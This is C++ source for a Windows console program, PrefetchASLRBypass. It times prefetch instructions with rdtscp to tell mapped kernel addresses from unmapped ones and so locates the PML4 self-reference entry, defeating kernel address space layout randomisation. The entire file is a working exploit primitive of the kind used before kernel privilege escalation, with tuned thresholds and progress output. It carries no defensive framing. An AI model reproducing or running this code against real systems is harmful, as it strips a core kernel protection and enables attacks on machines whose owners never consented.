// PrefetchASLRBypass.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <intrin.h>
#include <Windows.h>
#include <vector>
#include <algorithm>

#define PAGE_SIZE 0x1000
#define MEDIAN_SAMPLES 20
#define ITERATIONS 200000
#define MAGIC_UNMAPPED 0x180c06000000
#define KNOWN_MAPPED_HAL 0xFFFFFFFFFFD00000
#define NUMBER_OF_PAGE_PROBES 5

#define MAGIC_ADDRESS 0x100804020000


UINT64 KNOWN_MAPPED;
UINT32 ConsistencyCounter = 0;
std::vector<PVOID> v_pages;

typedef struct _PML4_SELF_REF {
	UINT64 VirtualAddress;
	UINT32 Index;
	UINT32 UnamppedCount;
	float Cycles;
} PML4_SELF_REF, *PPML4_SELF_REF;

std::vector<PPML4_SELF_REF> pml4_self_ref_potential_array;
std::vector<PPML4_SELF_REF> pml4_self_ref_final_array;

#define GET_INDEX(va)  ( ((va >> 39) & 0x1ff )) 

typedef UINT64(*_PFN_SIDE_CHANNEL)(PVOID);
_PFN_SIDE_CHANNEL pfn_side_channel = NULL;

float DIFFERENCE_THRESHOLD;

#pragma optimize( "", off )

UINT64 call_prefetch(PVOID address) {
	unsigned int tsc_aux0, tsc_aux1;
	UINT64 begin, difference = 0;
	begin = __rdtscp(&tsc_aux0);
	_m_prefetch((void *)address);
	difference = __rdtscp(&tsc_aux1) - begin;
	return difference;
}

#pragma optimize( "", on )

bool comp_cycles(float i, float j) { return (i<j); }

bool Comp_PML4_SELF_REF(PPML4_SELF_REF i, PPML4_SELF_REF j) {
	return (i->Cycles < j->Cycles);
}

float get_average(PVOID lpAddress, UINT iterations) {
	float result = 0;
	for (int i = 0; i < iterations; i++) {
		result += pfn_side_channel(lpAddress);
	}
	result = result / iterations;
	//printf("Average: %08f\n", result);
	return result;
}

float get_median(PVOID lpAddress) {
	std::vector<float> probe_vector;
	for (int i = 0; i < MEDIAN_SAMPLES; i++) {
		probe_vector.push_back(get_average(lpAddress, ITERATIONS));
	}
	std::sort(probe_vector.begin(), probe_vector.end(), comp_cycles);
	return probe_vector.at(MEDIAN_SAMPLES / 2);
	//return probe_vector.at(0);
}

UINT64 get_pxe_address(UINT64 address, UINT entry) {
	UINT64 result = address >> 9;
	UINT64 lower_boundary = ((UINT64)0xFFFF << 48) | ((UINT64)entry << 39);
	UINT64 upper_boundary = (((UINT64)0xFFFF << 48) | ((UINT64)entry << 39) + 0x8000000000 - 1) & 0xFFFFFFFFFFFFFFF8;
	result = result | lower_boundary;
	result = result & upper_boundary;
	return result;
}

void alloc_probing_pages(void) {
	PVOID p = NULL;
	for (int i = 0; i < NUMBER_OF_PAGE_PROBES; i++) {
		p = VirtualAlloc(NULL, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		printf("Allocation %d: %p\n", i, p);
		memset(p, 0x41, PAGE_SIZE);
		v_pages.push_back(p);
	}
	p = VirtualAlloc((LPVOID)MAGIC_ADDRESS, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (p) {
		memset(p, 0x41, 1);
		v_pages.push_back(p);
	}
}

void dealloc_probing_pages(void) {
	for (std::vector<PVOID>::iterator it = v_pages.begin(); it != v_pages.end(); ++it) {
		VirtualFree(*it, PAGE_SIZE, MEM_RELEASE);
	}
	v_pages.clear();
}


void ReleasePML4SelfRefArray(void) {
	for (std::vector<PPML4_SELF_REF>::iterator it = pml4_self_ref_potential_array.begin();
		it != pml4_self_ref_potential_array.end();
		++it)
	{
		//printf("Left in Potential Array: %llx\n", (*it)->VirtualAddress);
		HeapFree(GetProcessHeap(), 0, *it);
	}
	pml4_self_ref_potential_array.clear();

	for (std::vector<PPML4_SELF_REF>::iterator it = pml4_self_ref_final_array.begin();
		it != pml4_self_ref_final_array.end();
		++it)
	{
		//printf("Left in Final Array: %llx\n", (*it)->VirtualAddress);
		HeapFree(GetProcessHeap(), 0, *it);
	}
	pml4_self_ref_final_array.clear();
}

BOOL verify_pml4_self_ref_entry(PPML4_SELF_REF pml4_self_ref, float unmapped_time, float mapped_time) {
	// Test for mapped/unmapped for every page that was allocated
	// based on the given potential pml4_self_ref entry 
	UINT64 entry = pml4_self_ref->Index;
	UINT64 pte = 0;
	float med_x;
	printf("Potential SelfRef: %p\n", pml4_self_ref->VirtualAddress);
	for (std::vector<PVOID>::iterator page = v_pages.begin(); page != v_pages.end(); ++page) {
		pte = get_pxe_address((UINT64)*page, entry);
		med_x = get_median((PVOID)pte);
		if (abs(med_x - mapped_time) > DIFFERENCE_THRESHOLD) {
			printf("-] PTE %p looks unmapped! - Time: %02f\n", pte, med_x);
			return FALSE;
		}
		printf("+] PTE %p looks mapped! - Time: %02f\n", pte, med_x);
	}
	return TRUE;
}

UINT64 verify_pml4_final_array(float mapped_time) {
	UINT64 pte_x = 0;
	float med_x;

	printf("+] Verifying final array...\n");
	
	if (pml4_self_ref_final_array.size() == 1) {
		return pml4_self_ref_final_array.at(0)->VirtualAddress;
	}
	
	for (std::vector<PPML4_SELF_REF>::iterator it = pml4_self_ref_final_array.begin();
		it != pml4_self_ref_final_array.end();
		it++)
	{
		
		/*
		Let's use and UNMAPPED ADDRESS to decide which one is the correct one
		The fake dummy one will have all mapped, while the real one doesn't
		*/
		pte_x = get_pxe_address(MAGIC_UNMAPPED, (*it)->Index);
		med_x = get_median((PVOID)pte_x);
		printf("+] PTE: %llx - Cycles: %02f\n", pte_x, med_x);
		if (abs(med_x - mapped_time) > DIFFERENCE_THRESHOLD) {
			return (*it)->VirtualAddress;
		}
	}


	return 0;
}

float get_array_average() {
	float media = 0;
	for (std::vector<PPML4_SELF_REF>::iterator it = pml4_self_ref_potential_array.begin();
		it != pml4_self_ref_potential_array.end();
		++it)
	{		
		media += (*it)->Cycles;
	}
	media = media / pml4_self_ref_potential_array.size();
	return media;
}

UINT64 LeakPML4(void) {
	
	UINT64 pte_x = 0;
	float med_x = 0;
	//UINT64 real_pml4_self_ref = 0;

	printf("+] Getting cycles for every potential address...\n");

	// Get cycles for every potential address
	for (std::vector<PPML4_SELF_REF>::iterator it = pml4_self_ref_potential_array.begin();
		it != pml4_self_ref_potential_array.end();
		++it)
	{
		printf(".");
		(*it)->Cycles = get_median((PVOID)(*it)->VirtualAddress);
	}

	// Sort
	std::sort(pml4_self_ref_potential_array.begin(), pml4_self_ref_potential_array.end(), Comp_PML4_SELF_REF);

	// Get the minimum value
	float Mapped_time = pml4_self_ref_potential_array.at(0)->Cycles;
	float Unmapped_time = pml4_self_ref_potential_array.at(pml4_self_ref_potential_array.size()-1)->Cycles;
	

	printf("Mapped time: %02f\n", Mapped_time);
	printf("UNMapped time: %02f\n", Unmapped_time);
	

	// We essentially have three groups:
	// 1: Mapped pages
	// 2: Partially mapped pages (existent entries for PML4, PDPT and PD but not for PT)
	// 3: Unmapped pages
	// We know that the majority is going to be in the 2nd group
	float media = get_array_average();
	printf("Partially mapped: %02f\n", media);

	DIFFERENCE_THRESHOLD = abs(media - Mapped_time) / 2 - 1;
	printf("DIFFERENCE_THRESHOLD: %02f\n", DIFFERENCE_THRESHOLD);

	//
	for (std::vector<PPML4_SELF_REF>::iterator it = pml4_self_ref_potential_array.begin();
		it != pml4_self_ref_potential_array.end();
		)
	{
		if (abs((*it)->Cycles - Mapped_time) < DIFFERENCE_THRESHOLD) {
			printf("Virtual Addr: %llx - Cycles: %02f\n", (*it)->VirtualAddress, (*it)->Cycles);
			if (verify_pml4_self_ref_entry(*it, 0, Mapped_time)) {
				printf("+] Removing %03x from initial array and pushing it into final array\n", (*it)->Index);
				pml4_self_ref_final_array.push_back(*it);
				it = pml4_self_ref_potential_array.erase(it);
			}
			else {
				it++;
			}
		}
		else {
			it++;
		}
	}
	return verify_pml4_final_array(Mapped_time);
}

int _get_number_of_processors(void) {
	SYSTEM_INFO sysinfo = { 0 };
	GetSystemInfo(&sysinfo);
	return sysinfo.dwNumberOfProcessors;
}

void set_processor_affinity(void) {
	GROUP_AFFINITY affinity = { 0 };
	affinity.Group = _get_number_of_processors() - 1;
	affinity.Mask = 1;
	SetThreadGroupAffinity(GetCurrentThread(), &affinity, NULL);
}

void initialize_pml4_array(void) {
	UINT64 virtualAddress = 0;
	PPML4_SELF_REF p = NULL;
	for (int i = 0x100; i < 0x200; i++) {
		virtualAddress =
			((UINT64)0xFFFF << 48) |
			((UINT64)i << 39) |
			((UINT64)i << 30) |
			((UINT64)i << 21) |
			((UINT64)i << 12) |
			((UINT64)i * 8);
		p = (PPML4_SELF_REF)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PML4_SELF_REF));
		p->VirtualAddress = virtualAddress;
		p->Index = GET_INDEX(virtualAddress);
		p->UnamppedCount = 0;

		pml4_self_ref_potential_array.push_back(p);
	}
}

UINT64 GetPML4SelfRef(void) {

	//pfn_side_channel = side_channel_exception;
	pfn_side_channel = call_prefetch;

	// Tested on Core i7-6700K
	DIFFERENCE_THRESHOLD = 2.5;

	//printf("+] Setting max priority\n");
	//set_thread_priority();
	printf("+] Setting thread affinity to CPU 0\n");
	set_processor_affinity();
	printf("+] Getting all the potential PML4 SelfRef\n");
	initialize_pml4_array();

	printf("+] Allocating probing target pages...\n");
	alloc_probing_pages();

	UINT64 PML4SelfRef = LeakPML4();
	while (PML4SelfRef == 0) {
		ConsistencyCounter = 0;
		PML4SelfRef = LeakPML4();
	}

	printf("Real PML4 SelfRef Found: %llx\n", PML4SelfRef);

	ReleasePML4SelfRefArray();
	dealloc_probing_pages();

	return PML4SelfRef;
}

int main()
{
	printf("Result: %llx\n", GetPML4SelfRef());
	return 0;
}

